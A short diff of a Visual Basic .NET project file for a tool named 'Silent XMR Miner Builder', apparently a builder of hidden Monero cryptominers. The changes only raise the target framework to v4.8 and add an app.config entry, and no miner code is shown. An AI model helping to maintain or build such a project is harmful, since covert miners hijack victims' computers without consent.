@@ -11,7 +11,7 @@
     <AssemblyName>Silent XMR Miner Builder</AssemblyName>
     <FileAlignment>512</FileAlignment>
     <MyType>WindowsForms</MyType>
-    <TargetFrameworkVersion>v4.5</TargetFrameworkVersion>
+    <TargetFrameworkVersion>v4.8</TargetFrameworkVersion>
     <IsWebBootstrapper>false</IsWebBootstrapper>
     <TargetFrameworkProfile>
     </TargetFrameworkProfile>
@@ -148,6 +148,7 @@
       <DependentUpon>Settings.settings</DependentUpon>
       <DesignTimeSharedInput>True</DesignTimeSharedInput>
     </Compile>
+    <None Include="app.config" />
     <None Include="bin\Release\Includes.zip" />
     <None Include="My Project\app.manifest">
       <SubType>Designer</SubType>
